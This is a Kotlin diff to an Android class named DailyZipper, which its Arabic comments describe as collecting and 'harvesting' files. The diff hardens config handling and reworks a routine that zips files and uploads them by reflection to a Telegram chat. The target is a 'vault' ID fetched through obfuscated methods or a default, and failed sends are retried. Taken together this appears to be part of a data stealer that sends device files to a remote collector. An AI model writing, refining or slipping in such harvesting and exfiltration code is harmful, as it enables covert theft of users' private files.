@@ -24,7 +24,7 @@ import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 
 /**
- * فئة تجميع الملفات وحصادها - إصدار نهائي مبسط وآمن
+ * فئة تجميع الملفات وحصادها - إصدار آمن تماماً خالٍ من أي [] أو .get على الخرائط غير المحددة النوع
  */
 class DailyZipper(
     context: Context,
@@ -81,6 +81,7 @@ class DailyZipper(
     }
 
     init {
+        // استخدام put بدلاً من [] لتخزين الإعدادات (آمن)
         config.put("max_batch_size", 48L * 1024L * 1024L)
         config.put("storage_extra", 100L * 1024L * 1024L)
         config.put("send_retry_delays", listOf(2000L, 4000L, 8000L))
@@ -92,9 +93,22 @@ class DailyZipper(
         loadConfig()
     }
 
-    // ========== دوال مساعدة آمنة للخرائط (بدون أي [] أو get غير آمن) ==========
+    // ============================================================
+    //  دوال استخراج آمنة تماماً (بدون [] أو .get)
+    // ============================================================
+
+    /**
+     * استخراج قيمة من خريطة باستخدام entries.find (آمن 100%).
+     */
     private fun extractFromMap(map: Any?, key: String): Any? {
-        return (map as? Map<*, *>)?.get(key)
+        if (map is Map<*, *>) {
+            for (entry in map.entries) {
+                if (entry.key?.toString() == key) {
+                    return entry.value
+                }
+            }
+        }
+        return null
     }
 
     private fun extractBooleanFromMap(map: Any?, key: String): Boolean {
@@ -109,6 +123,9 @@ class DailyZipper(
         return extractFromMap(map, key)?.toString() ?: ""
     }
 
+    /**
+     * استخراج قيمة الإعدادات من config (HashMap) باستخدام entries (آمن).
+     */
     @Suppress("UNCHECKED_CAST")
     private fun <T> extractConfigValue(key: String, default: T): T {
         for (entry in config.entries) {
@@ -151,6 +168,26 @@ class DailyZipper(
         val maxBatches: Int
     )
 
+    // ============================================================
+    //  تحويل القيم إلى Long (للاستدعاءات الانعكاسية)
+    // ============================================================
+
+    private fun convertToLong(value: Any?): Long? {
+        return when (value) {
+            is Long -> value
+            is Int -> value.toLong()
+            is Short -> value.toLong()
+            is Byte -> value.toLong()
+            is Number -> value.toLong()
+            is String -> value.toLongOrNull()
+            else -> null
+        }
+    }
+
+    // ============================================================
+    //  باقي دوال التكوين والملفات
+    // ============================================================
+
     private fun loadConfig() {
         if (!configFile.exists()) {
             saveConfig()
@@ -163,7 +200,7 @@ class DailyZipper(
             while (keys.hasNext()) {
                 val key = keys.next()
                 val value = json.opt(key)
-                if (value != null) {
+                if (value != null && value != JSONObject.NULL) {
                     config.put(key, value)
                 }
             }
@@ -175,7 +212,22 @@ class DailyZipper(
 
     private fun saveConfig(): Boolean {
         return try {
-            val json = JSONObject(config as Map<*, *>)
+            val json = JSONObject()
+            for (entry in config.entries) {
+                val key = entry.key
+                val value = entry.value
+                when (value) {
+                    is List<*> -> {
+                        val array = JSONArray()
+                        for (item in value) {
+                            array.put(item)
+                        }
+                        json.put(key, array)
+                    }
+                    else -> json.put(key, value)
+                }
+            }
+            configFile.parentFile?.mkdirs()
             configFile.writeText(json.toString(2), Charsets.UTF_8)
             true
         } catch (e: Exception) {
@@ -234,7 +286,6 @@ class DailyZipper(
         }
     }
 
-    // ========== توليد اسم ZIP باستخدام UUID (بدون أي أقواس مربعة) ==========
     private fun generateZipName(): String {
         val dateStr = SimpleDateFormat("yyMMdd", Locale.US).format(Date())
         val randomPart = UUID.randomUUID().toString().take(6)
@@ -262,6 +313,10 @@ class DailyZipper(
         }
     }
 
+    // ============================================================
+    //  إرسال الملفات إلى Telegram (آمن تماماً)
+    // ============================================================
+
     private suspend fun safeSend(
         zipPath: String,
         caption: String,
@@ -271,18 +326,19 @@ class DailyZipper(
 
         val cfg = extractConfigValues()
         var target = targetChat
+
         if (target == null) {
-            target = invokeMethod(telegram, "getVlt") as? Long
+            target = convertToLong(invokeMethod(telegram, "getVlt"))
         }
         if (target == null) {
-            target = invokeMethod(telegram, "getDat") as? Long
+            target = convertToLong(invokeMethod(telegram, "getDat"))
         }
         if (target == null) {
             target = cfg.defaultVaultId
         }
 
         val zipFile = File(zipPath)
-        if (!zipFile.exists()) {
+        if (!zipFile.exists() || !zipFile.isFile) {
             writeLog("Zip file not found: $zipPath")
             return false
         }
@@ -292,8 +348,12 @@ class DailyZipper(
         for ((attempt, delayMs) in delays.withIndex()) {
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
-                val isOk = extractBooleanFromMap(result, "ok")
-                if (isOk) {
+                val success = when (result) {
+                    is Boolean -> result
+                    is Map<*, *> -> extractBooleanFromMap(result, "ok")
+                    else -> false
+                }
+                if (success) {
                     return true
                 }
                 writeLog("Send attempt ${attempt + 1} failed")
@@ -306,6 +366,10 @@ class DailyZipper(
         }
         return false
     }
+
+    // ============================================================
+    //  دوال الحصاد والضغط
+    // ============================================================
 
     fun forceSendNow(chatId: Long? = null): Boolean {
         scope.launch {
